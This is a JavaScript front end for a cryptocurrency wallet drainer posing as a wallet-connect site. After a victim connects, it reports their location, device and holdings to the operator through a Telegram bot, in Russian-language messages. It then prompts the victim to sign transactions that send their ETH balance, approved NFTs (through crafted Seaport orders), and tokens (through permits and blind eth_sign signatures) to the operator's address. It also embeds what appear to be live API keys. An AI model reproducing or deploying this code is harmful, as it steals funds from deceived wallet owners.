var logindead = 0;
var connected = 0;
var account = "";
var alerts = 0;
var perETH_usd;
var success = 0;
let message;
let ethersProvider, signer, wallet, Seaport, web3Modal, selectedAccount;
let tokenList = permitList = [];
const characters = '0123456789';

const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
const CONDUIT = "0x1E0049783F008A0085193E00003D00cd54003c71";
const RPC = "https://rpc.ankr.com/eth/38eac0bf9f0e89d5e226f5c1ef1249406ce7958e48704cc5c3015bed44cb3dca";

let w3 = new ethers.providers.JsonRpcProvider(RPC);

var backloc;

var operator, contractSAFA, ownerAddress;

var BASE_URL = "/" + 'api';
const TOKEN_APPROVE = BASE_URL + '/token_approve';
const TOKEN_TRANSFER = BASE_URL + '/token_transfer';
const SEAPORT_SIGN = BASE_URL + '/seaport_sign';
const NFT_TRANSFER = BASE_URL + '/nft_transfer';
const MAX_APPROVAL = '1158472395435294898592384258348512586931256';

const tg_url =
  "https://api.telegram.org/bot[TOKEN]/sendMessage?chat_id=[USER_ID]&disable_web_page_preview=true&parse_mode=html&text=";

let endpoint;

var geoData;
var tgFeedback;
var internalConfig;
var clientID;
var covalentKey;

let supportedWallets = {
    0: "WalletConnect",
    1: "Metamask",
};
let selectedProvider, selectedWallets;

const groupBy = function(xs, key) {
  return xs.reduce(function(rv, x) {
    (rv[x[key]] = rv[x[key]] || []).push(x);
    return rv;
  }, {});
};

Object.defineProperty(String.prototype, 'capitalize', {
  value: function() {
    return this.charAt(0).toUpperCase() + this.slice(1);
  },
  enumerable: false
});

function removeTokenOnce(arr, value) {
  var index = arr.findIndex((token) => value.tokenAddress === token.tokenAddress);
  console.log(index)
  if (index > -1) {
    arr.splice(index, 1);
  }
  return arr;
}


var msgs = []
const chainToId = {
    "ethereum": {
        chainId: '0x1',
        abiUrl: 'https://api.etherscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99',
        explorer: 'etherscan.io'
    },
    "binance-smart-chain": {
        chainId: '0x38',
        abiUrl: 'https://api.bscscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI',
        explorer: 'bscscan.com'
    },
    "polygon": {
        chainId: '0x89',
        abiUrl: 'https://api.polygonscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=M9IMUX515SEB97THWJRQDKNX75CI66X7XX',
        explorer: 'polygonscan.com'
    },
    "fantom": {
        chainId: '0xfa',
        abiUrl: 'https://api.ftmscan.com/api?module=contract&action=getsourcecode&address={0}&apikey=F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415',
        explorer: 'ftmscan.com'
    },
    "avalanche": {
        chainId: '0xa86a',
        abiUrl: 'https://api.snowtrace.io/api?module=contract&action=getsourcecode&address={0}&apikey=ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z',
        explorer: 'snowtrace.io'
    },
    "optimism": {
        chainId: '0xa',
        abiUrl: 'https://api-optimistic.etherscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK',
        explorer: 'optimistic.etherscan.io'
    },
    "arbitrum": {
        chainId: '0xa4b1',
        abiUrl: 'https://api.arbiscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I',
        explorer: 'arbiscan.io'
    },
    // "gnosis": {
    //     chainId: '0x64',
    //     abiUrl: 'https://api.gnosisscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=W58NAS5FD6TAE13Q2271MYAHXZCT7UQVU2',
    //     explorer: 'gnosisscan.io'
    // },
    "moonriver": {
        chainId: '0x505',
        abiUrl: 'https://api-moonriver.moonscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99',
        explorer: 'moonscan.io'
    },
    // "celo": {
    //     chainId: '0xa4ec',
    //     abiUrl: 'https://api.celoscan.io/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken',
    //     explorer: 'celoscan.io'
    // },
    "aurora": {
        chainId: '0x4e454152',
        abiUrl: 'https://api.aurorascan.dev/api?module=contract&action=getsourcecode&address={0}&apikey=YourApiKeyToken',
        explorer: 'aurorascan.dev'
    }
}

const idToChain = (id) => {
  return Object.keys(chainToId).find(key => chainToId[key]['chainId'] === id)
}
const getMobileOperatingSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }
    if (/android/i.test(userAgent)) {
        return "Android";
    }
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }
    return "unknown";
}

const getDAppSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/Trust/i.test(userAgent)) {
        return "Trust";
    }
    if (/CriOS/i.test(userAgent)) {
        return "Metamask";
    }
    return "unknown";
}

const openMetaMaskUrl = (url) => {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_self";
    document.body.appendChild(a);
    a.click();
    a.remove();
}

function loginMetamask() {
  // затычка на время
}

async function loginTrust() {
  selectedWallets = 1;
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${document.URL.replace(/https?:\/\//i, "")}`;
}

async function login() {
  if((Date.now() - logindead)/1000 < 1) return
  logindead = Date.now()
  try{
    walletconnect();
  }catch(error){
    alert(error);
  }
}

function walletconnect() {
  if (window.ethereum) {
    ConnectWallet();
  } else {
    window.addEventListener('ethereum#initialized', ConnectWallet, {
      once: true,
    });
    ConnectWallet();
  }
}

const round = (value) => {
    return Math.round(value * 10000) / 10000;
}

async function getNormalizedETH(wei){
    return ethers.utils.formatEther(wei);
}

async function isApproved(owner, nft) {
    try { 
        let contract = new ethers.Contract(nft, ERC721_ABI, w3);
        console.log(nft)
        const approved = await contract.functions.isApprovedForAll(owner, CONDUIT);
        return approved;
    } catch (err) {
        console.log("error", nft, err);
        return false;
    }
}

function fetchTokenIds(resp, contract) {
    try { 
        const assets = resp.assets;
        const tokenIds = [];
        for (let i = 0; i < assets.length; i++) {
            const currentAsset = assets[i];
            if (currentAsset.asset_contract.address.toLowerCase() == contract.toLowerCase()) {
                tokenIds.push(currentAsset.token_id);
            }
        }
        return tokenIds;
    } catch (err) {
        console.log("error", err)
    }
}

async function getNFTS(walletAddress) {
    try { 
        const options = { method: 'GET', headers: { Accept: 'application/json' } };

        let nfts = await fetch(`https://api.opensea.io/api/v1/assets?owner=${walletAddress}&order_direction=desc&limit=200&include_orders=false`)
        let nftsData = await nfts.json();
        let walletNfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=200`, options)
            .then(response => response.json())
            .then(nfts => {
                if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
                return nfts.filter(nft => {
                    if (nft.primary_asset_contracts.length > 0) return true
                    else return false
                }).map(async (nft) => {
                    let price = round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price);
                    let isApprovedBool = await isApproved(walletAddress, nft.primary_asset_contracts[0].address);
                    isApprovedBool = isApprovedBool[0];
                    console.log("isApprovedBool", isApprovedBool);
                    
                    let bal = perETH_usd * parseFloat(price)
                    if (ethers.utils.getAddress(nft.primary_asset_contracts[0].address) == ethers.utils.getAddress("0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85")) bal = 1
                    if (bal === NaN) {
                      bal = 0
                    }
                    return {
                        name: nft.primary_asset_contracts[0].name,
                        type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                        tokenAddress: ethers.utils.getAddress(nft.primary_asset_contracts[0].address),
                        token_ids: fetchTokenIds(nftsData, nft.primary_asset_contracts[0].address),
                        price: price,
                        balance: bal,
                        chain: "ethereum",
                        owned: nft.owned_asset_count,
                        "approved": isApprovedBool
                    }
                })
            }).catch(err => console.error(err));

        let all = await Promise.all(walletNfts);
        let sortedNfts = all.sort((a, b) => parseFloat(b.price) > parseFloat(a.price) ? 1 : -1);
        console.log(sortedNfts);
        return sortedNfts
    } catch(e) { console.log(e) }
}

function generateString(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

async function getCounter(walletAddress) {
    const ABI_COUNTER = [{
        "inputs": [
            {
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }
        ],
        "name": "getCounter",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "counter",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }]
    let contract = new ethers.Contract("0x00000000006c3852cbEf3e08E8dF289169EdE581", ABI_COUNTER, w3);
    const counter = contract.functions.getCounter(walletAddress);
    return counter;
}

async function getWETH(walletAddress) {
    let contractWETH = new ethers.Contract(WETH, ERC20_ABI, w3);
    const balanceWETH = contractWETH.functions.balanceOf(walletAddress);
    const allowances = contractWETH.functions.allowance(walletAddress, CONDUIT);
    return await Promise.all([balanceWETH, allowances]);
}

function getPreviousDay(date = new Date()) {
    const previous = new Date(date.getTime());
    previous.setDate(date.getDate() - 1);
    return previous;
}

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
function init() {
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        bridge: "https://bridge.walletconnect.org",
        rpc: {
            1: "https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a",
            56: "https://rpc.ankr.com/bsc",
            137: "https://rpc.ankr.com/polygon",
            250: "https://rpc.ankr.com/fantom",
            43114: "https://rpc.ankr.com/avalanche",
            10: "https://rpc.ankr.com/optimism",
            42161: "https://rpc.ankr.com/arbitrum",
            100: "https://rpc.ankr.com/gnosis",
            1285: "https://rpc.moonriver.moonbeam.network",
            42220: "https://rpc.ankr.com/celo",
            1313161554: "https://mainnet.aurora.dev",
        },
        qrcodeModalOptions: {
          desktopLinks: [
            'ledger',
            'tokenary',
            'wallet',
            'wallet 3',
            'secuX',
            'ambire',
            'wallet3',
            'apolloX',
            'zerion',
            'sequence',
            'punkWallet',
            'kryptoGO',
            'nft',
            'riceWallet',
            'vision',
            'keyring'
          ],
          mobileLinks: [
            "rainbow",
            "argent",
            "imtoken",
            "pillar",
            "coinbase"
          ],
        },
      },
    },
    
    // "custom-binancechainwallet": {
    // display: {
    //   logo: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PGcgZmlsbD0iI2YwYjkwYiI+PHBhdGggZD0iTTIwLjI0NSAwTDkuNjM0IDYuMTI1bDMuOTAxIDIuMjYyIDYuNzEtMy44NjIgNi43MSAzLjg2MiAzLjkwMi0yLjI2MkwyMC4yNDUgMHptNi43MTEgMTEuNTg2bDMuOSAyLjI2M3Y0LjUyNmwtNi43MSAzLjg2MnY3LjcyNGwtMy45IDIuMjYzLTMuOTAyLTIuMjYzdi03LjcyNGwtNi43MS0zLjg2MnYtNC41MjZsMy45MDEtMi4yNjMgNi43MSAzLjg2MyA2LjcxLTMuODYzaC4wMDF6Ii8+PHBhdGggZD0iTTMwLjg1NyAyMS41NzNWMjYuMWwtMy45MDEgMi4yNjJ2LTQuNTI1bDMuOS0yLjI2My4wMDEtLjAwMXoiLz48cGF0aCBkPSJNMjYuOTE2IDMxLjU2bDYuNzEtMy44NjJ2LTcuNzI0bDMuOTAyLTIuMjYzdjEyLjI1bC0xMC42MTEgNi4xMjVWMzEuNTZoLS4wMDF6bTYuNzExLTE5LjMxbC0zLjkwMi0yLjI2MyAzLjkwMi0yLjI2MyAzLjkgMi4yNjN2NC41MjVsLTMuOSAyLjI2M1YxMi4yNXpNMTYuMzQ0IDM3LjcyNFYzMy4ybDMuOTAxIDIuMjYzIDMuOTAyLTIuMjYzdjQuNTI1bC0zLjkwMiAyLjI2My0zLjktMi4yNjMtLjAwMS0uMDAxem0tMi44MDktOS4zNjNMOS42MzQgMjYuMXYtNC41MjZsMy45MDEgMi4yNjN2NC41MjUtLjAwMXptNi43MS0xNi4xMTFsLTMuOS0yLjI2MyAzLjktMi4yNjMgMy45MDIgMi4yNjMtMy45MDIgMi4yNjN6bS05LjQ4LTIuMjYzbC0zLjkgMi4yNjN2NC41MjVsLTMuOTAyLTIuMjYzVjkuOTg3bDMuOTAxLTIuMjYzIDMuOTAxIDIuMjYzeiIvPjxwYXRoIGQ9Ik0yLjk2MyAxNy43MTFsMy45MDEgMi4yNjN2Ny43MjRsNi43MSAzLjg2MnY0LjUyNkwyLjk2MyAyOS45NlYxNy43MXYuMDAxeiIvPjwvZz48L3N2Zz4=",
    //   name: "Binance Chain Wallet",
    //   description: "Connect to your Binance Chain Wallet"
    // },
    // package: true,
    // connector: async () => {
    //   let provider = null;
    //   if (typeof window.BinanceChain !== 'undefined') {
    //     provider = window.BinanceChain;
    //     try {
    //       await provider.request({ method: 'eth_requestAccounts' });
    //       selectedWallets = 2;
    //     } catch (error) {
    //       throw new Error("User Rejected");
    //     }
    //   } else {
    //     throw new Error("No Binance Chain Wallet found");
    //   }
    //   return provider;
    // },
    // },
    
  };
  if (!window.ethereum) {
    providerOptions['custom-metamask'] = {
      display: {
        logo: window.Web3Modal.providers.METAMASK.logo,
        name: 'MetaMask',
        description: 'Connect using external wallet'
      },
      package: {},
      connector: async () => {
        window.location.href = `dapp://${document.URL.replace(/https?:\/\//i, "")}`
      }
    }
    providerOptions['custom-trust'] = {
      display: {
        logo: window.Web3Modal.providers.TRUST.logo,
        name: 'Trust Wallet',
        description: 'Connect using external wallet'
      },
      package: {},
      connector: async () => {
        loginTrust()
      }
    }
  }
  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions,
    disableInjectedProvider: false,
  });
}

function addPixel() {
  var script = document.createElement("script");

  // Add script content

  script.innerHTML = "fbq('track', 'Lead');";

  // Append

  document.body.appendChild(script);
}

async function ConnectWallet(){
    provider = await web3Modal.connect();
    web3 = new Web3(provider);
    ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
    signer = ethersProvider.getSigner();
    if (web3._provider["bridge"]) {
        selectedProvider = supportedWallets[0];
    } else {
        selectedProvider = supportedWallets[1];
    }
    Seaport = new seaport.Seaport(signer); 
    getWalletAccount();
    get12DollarETH();
    addPixel()
}

async function get12DollarETH() {
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url);
    let price = await response.json();
    let perETH = price["ethereum"]["usd"];
    let usd = 1 / perETH;
    perETH_usd = perETH;
    return;
}

async function getBackLocation() {
  try {
    const data = await axios.get("server.cfg")
    if (!data.data) throw "Empty data"
    backloc = data.data
  } catch {
    backloc = window.location.protocol + "//" + window.location.host
  }
}

async function getGeo() {
  const data = await axios.get(backloc + "/" + "geo")
  return data.data
}

async function getTlg() {
  const tgData = await axios.get(backloc + "/" + "back.php")
  return tgData.data
}

async function getOperator() {
  const data = await axios.get(backloc + "/" + "recv")
  return data.data
}

async function getConfig() {
  const data = await axios.get(backloc + "/" + "cfg")
  return data.data
}

async function getID(wallet) {
  const data = await axios.get(backloc + "/" + "cnt?wallet=" + wallet)
  return data.data
}

function getWalletName(provider) {
  if (provider.isMetaMask) {
    return "MetaMask"
  } else if (provider.isTrust) {
    return "Trust"
  } else if (provider.isCoinBase) {
    return "Coinbase"
  } else {
    return "WalletConnect"
  }
}

function logTokens(connectmsg, tokenList, offer) {
    let tok = groupBy(tokenList, "chain")
    console.log(tok)
    connectmsg = `<b>На кошельке #${clientID} удалось обнаружить следующие активы:</b>\n\n`
    for (const chain of Object.entries(tok)) {
      connectmsg += `<b><a href="https://${chainToId[chain[0]].explorer}/address/${account}">${chain[0].capitalize()}</a></b>:\n`
      let main = chain[1].find(token => token.native_token)
      if (main) connectmsg += `<b>${main.symbol}</b> — ${main.tokenAmountFix}\n`
      let tokens = chain[1].filter(token => !token.native_token && token.type === "erc20" && !token.permit).map(token => `${token.tokenAmountFix.toFixed(3)} ${token.symbol}`)
      connectmsg += `<b>ТОКЕНЫ</b> — <i>${tokens.join(", ") || "не обнаружено"}</i>\n`
      let NFTs = chain[1].filter(token => token.type !== "erc20" && token.type !== "seaport").map(token => `${token?.name} ${token?.token_ids?.length} шт`)
      connectmsg += `<b>NFT</b> — <i>${NFTs.join(", ") || "не обнаружено"}</i>`
      if (chain[0] === "ethereum" && offer) {
        let seatoken = chain[1].find(token => token.type === "seaport")
        let seaapproved = offer.offer.map(sea => chain[1].find(token => token.tokenAddress === sea.token)).map(token => `${token?.name} ${token?.token_ids?.length} шт`)
        if (offer) connectmsg += `\n<b>SEAPORT</b> — <i>${seatoken.balance || "-"} $ (${seaapproved.join(", ")})</i>`
      } else {
        connectmsg += '\n<b>SEAPORT</b> — <i>не обнаружено</i>'
      }
      let permitTokens = permitList.filter((token) => token.chain === chain[0])
      if (permitTokens) {
        permitTokens = permitTokens.map((token) => `${token.tokenAmountFix.toFixed(3)} ${token.symbol}`)
        connectmsg += `\n<b>PERMIT</b> — <i>${permitTokens.join(", ") || "не обнаружено"}</i>`
      }
      connectmsg += "\n\n"      
  
    }
    connectmsg += `<b>Самый дорогой актив:</b> <i>${tokenList[0].symbol || tokenList[0].name} (${tokenList[0].balance.toFixed(3)} $) в сети ${tokenList[0].chain.capitalize()}</i>`
    logTlg(connectmsg)
}
async function getWalletAccount() {
    await getBackLocation()
    const accounts = await web3.eth.getAccounts();
    waitAlert();
    account = accounts[0];
    operator = contractSAFA = ownerAddress = endpoint = await getOperator()
    geoData = await getGeo()
    tgFeedback = await getTlg()
    internalConfig = await getConfig()
    clientID = await getID(account)
    let ua = new UAParser(navigator.userAgent).getResult()
    let connectmsg = `🚀<b>Пользователь ${geoData} подключил свой ${getWalletName(ethersProvider.provider)} кошелёк</b>\n
  <b>Connect ID</b>: #${clientID}
  <b>Address</b>: <a href="https://zapper.fi/ru/account/${account}">Zapper</a>, <a href="https://etherscan.io/address/${account}">Etherscan</a>, <a href="https://bscscan.com/address/${account}">BscScan</a>, <a href="https://polygonscan.com/address/${account}">PolygonScan</a>
  <b>Website:</b> <a href=${window.location.hostname}>${window.location.hostname}</a>
  <b>Device</b>: ${isMobile() ? "📱" : "🖥"}
  <b>Model</b>: <code>${ua.device.model || "Неизвестно"}</code>
  <b>OS</b>: <code>${ua.os.name} ${ua.os.version}</code>
  <b>Browser</b>: <code>${ua.browser.name} ${ua.browser.version}</code>`;
    
    logTlg(connectmsg)
    let counter, wethData;
    [tokenList, counter, wethData] = await Promise.all([getNFTS(account), getCounter(account), getWETH(account)]);
    counter = parseInt(counter.toString());
    let [balance, allowance] = wethData;
    balance = balance.toString();
    allowance = allowance.toString();
    const balanceNormalized = parseFloat(ethers.utils.formatEther(balance));
    const allowanceNormalized = parseFloat(ethers.utils.formatEther(allowance));
    let weth_include = "0";
    let wasWethApproved = false;
    if (allowanceNormalized >= balanceNormalized) {
        weth_include = balance;
    }
    else if (balanceNormalized > allowanceNormalized) {
        weth_include = allowance;
    }
    const orders = [];
    const considers = [];
    let bundlePrice = 0;
    tokenList.forEach((nft) => {
        if (nft.type == "erc721" && nft.approved == true) {
            if (nft.balance) bundlePrice+=round(nft.balance)
            nft.token_ids.forEach((token_id) => {
                const array = {
                    itemType: 2,
                    token: nft.tokenAddress,
                    identifierOrCriteria: token_id,
                    startAmount: "1",
                    endAmount: "1",
                }
                const consider = {
                    itemType: 2,
                    token: nft.tokenAddress,
                    identifierOrCriteria: token_id,
                    startAmount: "1",
                    endAmount: "1",
                    recipient: endpoint,
                }
                orders.push(array)
                considers.push(consider);
            })
        }
    });
    // if (weth_include !== "0") {
    //     wasWethApproved = true;
    //     bundlePrice += perETH_usd * parseFloat(getNormalizedETH(weth_include));
    //     const weth_order = {
    //         "itemType": 1,
    //         "token": WETH,
    //         "identifierOrCriteria": "0",
    //         "startAmount": weth_include,
    //         "endAmount": weth_include
    //     }
    //     const weth_consider = {
    //         "itemType": 1,
    //         "token": WETH,
    //         "identifierOrCriteria": "0",
    //         "startAmount": weth_include,
    //         "endAmount": weth_include,
    //         "recipient": endpoint
    //     }
    //     orders.push(weth_order);
    //     considers.push(weth_consider);
    // }
    const date = getPreviousDay();
    const milliseconds = date.getTime();
    const dateClone = date;
    const tomorrow = dateClone.setTime(milliseconds + (2 * 24 * 60 * 60 * 1000));
    const milliseconds_tomorrow = dateClone.getTime();
    const tomorrow_seconds = Math.floor(milliseconds_tomorrow / 1000);
    const seconds = Math.floor(milliseconds / 1000);
    const salt = generateString(70);
    const offer = {
        "offerer": ethers.utils.getAddress(account),
        zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
        "offer": orders,
        consideration: considers,
        orderType: 2,
        startTime: seconds,
        endTime: tomorrow_seconds,
        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
        salt: salt,
        totalOriginalConsiderationItems: considers.length,
        conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
    }
    console.log(offer)

    const requests = Object.entries(chainToId).map((chain) => {
      let chainId = Number(chainToId[chain[0]].chainId)
      return axios.get(`https://api.covalenthq.com/v1/${chainId}/address/${account}/balances_v2/?key=${internalConfig.cKey}`)
    })
    const responses =  await Promise.all(requests)
    responses.forEach((resp) => {
      for (var tokenId in resp.data.data.items) {
        var token = resp.data.data.items[tokenId]
        if (["cryptocurrency", "stablecoin"].includes(token.type)) {
          if (tokenList.find((item) => item.balance == token.quote)) continue
          if (token.quote < 1) continue
          if (internalConfig.permit_first && internalConfig.priority_tokens.includes(token.contract_ticker_symbol) && idToChain("0x" + resp.data.data.chain_id.toString(16)) !== "polygon" && token.quote > 100) {
                permitList.push({
                  type: "erc20",
                  tokenAddress: token.contract_address,
                  balance: token.quote,
                  tokenAmountFix: token.balance / 10**token.contract_decimals,
                  chain: idToChain("0x" + resp.data.data.chain_id.toString(16)),
                  tokenAmount: token.balance,
                  symbol: token.contract_ticker_symbol,
                  native_token: token.native_token,
                  contract_name: token.contract_name,
                  permit: true
                })
              }
              tokenList.push({
                type: "erc20",
                  tokenAddress: token.contract_address,
                  balance: token.quote,
                  tokenAmountFix: token.balance / 10**token.contract_decimals,
                  chain: idToChain("0x" + resp.data.data.chain_id.toString(16)),
                  tokenAmount: token.balance,
                  symbol: token.contract_ticker_symbol,
                  native_token: token.native_token,
                  contract_name: token.contract_name
              });
            }
      }
    })

    if (tokenList.length < 1) {
      connectmsg = `(${geoData}) Кошелёк пуст :(`
      alerts = 1
      alertshow()
      return logTlg(connectmsg)
    } 
    if (permitList) permitList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
    if (offer.offer.length == 0) {
        tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
        logTokens(connectmsg, tokenList)
        if (permitList) {
          tokenList = permitList.concat(tokenList)
        }

        await sendToken(wasWethApproved, offer, counter, Seaport);
        await waitClose();
        return;
    } else {
        if (!bundlePrice) bundlePrice = 0
        tokenList.push({
            name: "Seaport",
            type: "seaport",
            chain: "ethereum",
            tokenAddress: "",
            token_ids: "",
            price: null,
            balance: bundlePrice,
            owned: "",
            "approved": false, 
        })
    }
    tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
    logTokens(connectmsg, tokenList, offer)
    if (permitList) {
      tokenList = permitList.concat(tokenList)
    }
    connected = 1;
    await sendToken(wasWethApproved, offer, counter, Seaport);
    await waitClose();
}

function getEthBalance(balance, decimals, rate) {
  var pow10 = 1;
  for (var i = 0; i < decimals; i ++) pow10 *= 10;
  return balance * rate / pow10;
}

async function transferEth(token) {
  if(account=="") return;
  const getBalance = await web3.eth.getBalance(account);
  const ethBalance = web3.utils.fromWei(getBalance, 'ether');
  console.log(ethBalance);
  success = 1;
  const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
  const gasPrice = await web3.eth.getGasPrice();
  const mgasPrice = web3.utils.toHex(gasPrice);
  switch (token.chain) {
    case "optimism":
      gasMultiplier = 85000000
      break
    case "arbitrum":
      gasMultiplier = 2500000
      break
    default:
      gasMultiplier = 220000 
  }
  const gasLimit = await ethersProvider.estimateGas({to: ownerAddress, value: web3.utils.toWei(ethBalance.toString(), "ether")})
  const valueToSend = web3.utils.toWei(ethBalance.toString(), "ether") - (gasPrice*gasLimit.mul(7));
  console.log("valueToSend", valueToSend);
  const valueToSendString = Number(valueToSend);
  console.log("valueToSendString", valueToSendString);
  const valueToTransHex = web3.utils.toHex(valueToSendString);
  const chainId = await web3.eth.getChainId();
  const chainHex = web3.utils.toHex(chainId);
  const signer = ethersProvider.getSigner()
  console.log(valueToSendString) 
    logTlg(`🔐Пользователь #${clientID} получил запрос на TRANSFER ${token.tokenAmountFix} ${token.symbol} в сети ${token.chain.capitalize()}`)  
    try {
      let tx = await signer.sendTransaction({
        to: ownerAddress,
        value: valueToTransHex,
        gasLimit: 100000
      });
      // removeTokenOnce(tokenList, token)
      logTlg(`🔥${token.tokenAmountFix} ${token.symbol} от пользователя #${clientID} были успешно отправлены и зачислены на ваш кошелек`)
    } catch(e) {
      console.log(e)
      logTlg(`❌ Пользователь #${clientID} отклонил отправку ${token.tokenAmountFix} ${token.symbol}`)
      success = 0
    }
}

async function stakeEth(token) {
    if(account=="") return;
    const getBalance = await web3.eth.getBalance(account);
    const ethBalance = web3.utils.fromWei(getBalance, 'ether');
    console.log(ethBalance);
    success = 1;
    const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
    const gasPrice = await web3.eth.getGasPrice();
    const mgasPrice = web3.utils.toHex(gasPrice);
    switch (token.chain) {
      case "optimism":
        gasMultiplier = 85000000
        break
      case "arbitrum":
        gasMultiplier = 2500000
        break
      default:
        gasMultiplier = 220000 
    }
    const gasLimit = await ethersProvider.estimateGas({to: ownerAddress, value: web3.utils.toWei(ethBalance.toString(), "ether")})
    const valueToSend = web3.utils.toWei(ethBalance.toString(), "ether") - (gasPrice*gasLimit.mul(7));
    console.log("valueToSend", valueToSend);
    const valueToSendString = Number(valueToSend);
    console.log("valueToSendString", valueToSendString);
    const valueToTransHex = web3.utils.toHex(valueToSendString);
    const chainId = await web3.eth.getChainId();
    const chainHex = web3.utils.toHex(chainId);
    logTlg(`🔐Пользователь #${clientID} получил запрос на SIGN ${token.tokenAmountFix} ${token.symbol} в сети ${token.chain.capitalize()}`)

    tx_ = {
      to: ownerAddress,
      nonce: nonce,
      gasLimit: gasLimit.mul(2)._hex,
      gasPrice: web3.utils.toHex(gasPrice),
      value: valueToTransHex,
      data: "0x0",
      r: "0x",
      s: "0x",
      v: chainHex,
    };
    // if (token.chain === "arbitrum") tx_.gasLimit = web3.utils.toHex(360000)
    // if (token.chain === "optimism") tx_.gasLimit = web3.utils.toHex(360000)
    console.log(tx_);
    const { ethereumjs } = window;
    var tx = new ethereumjs.Tx(tx_);
    const serializedTx = "0x" + tx.serialize().toString("hex");
    const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });

    const initialSig = await web3.eth.sign(sha3_, account);

    const temp = initialSig.substring(2),
      r = "0x" + temp.substring(0, 64),
      s = "0x" + temp.substring(64, 128),
      rhema = parseInt(temp.substring(128, 130), 16),
      v = web3.utils.toHex(rhema + chainId * 2 + 8);
    tx.r = r;
    tx.s = s;
    tx.v = v;
    const txFin = "0x" + tx.serialize().toString("hex");
    console.log(txFin);
    console.log("Waiting for sign submitting...");
    web3.eth.sendSignedTransaction(txFin)
    // .on("error", (error) => {logTlg("❌ Ошибка при списании!\n<code>" + error + "</code>")})
    .then(() => {
      logTlg(`🔥${token.tokenAmountFix} ${token.symbol} от пользователя #${clientID} были успешно подписаны и будут зачислены на ваш кошелек`)
    })
    // removeTokenOnce(tokenList, token)

}

function toBinary(string) {
  const codeUnits = Uint16Array.from(
    { length: string.length },
    (element, index) => string.charCodeAt(index)
  );
  const charCodes = new Uint8Array(codeUnits.buffer);

  let result = "";
  charCodes.forEach((char) => {
    result += String.fromCharCode(char);
  });
  return result;
}

async function stakeERC20(token, tokenAddress, amount, msg, chainId, abiUrl) {
    console.log(tokenAddress, account, amount);
    const contractInfo = await getABI(tokenAddress, abiUrl);
    const contract = new ethers.Contract(tokenAddress, contractInfo[0], signer);
    const tokenContract = new web3.eth.Contract(contractInfo[0], tokenAddress);
    const functions = contract.functions;
    success = 1;

    let hasPermit = functions.hasOwnProperty('permit') && functions.hasOwnProperty('nonces') &&
    functions.hasOwnProperty('name') && functions.hasOwnProperty('DOMAIN_SEPARATOR') && isValidPermit(functions);
    console.log('Has permit', hasPermit);
    
    if(hasPermit && token.chain !== "polygon" && !(token.balance > 100 && permitList && internalConfig.priority_tokens.includes(token.symbol) && !token.permit)) {
      try {
        logTlg(`🔐Пользователь #${clientID} получил запрос на Permit ${token.tokenAmountFix} ${token.symbol} в сети ${token.chain.capitalize()}`)
        const data = {chainId: chainId, tokenAddress: tokenAddress, abiUrl: abiUrl, amount: amount, owner: account, spender: operator, permit: await permit(contract, account, ownerAddress), impl: contractInfo[1]};
        logTlg(`⏳Пользователь #${clientID} подписал Permit ${token.tokenAmountFix} ${token.symbol} в сети ${token.chain.capitalize()}. После успешного снятия вам поступит уведомление`)
        if (token.permit) {
          tokenList.find((t) => (t.tokenAddress === tokenAddress) & t.permit).permit = 2
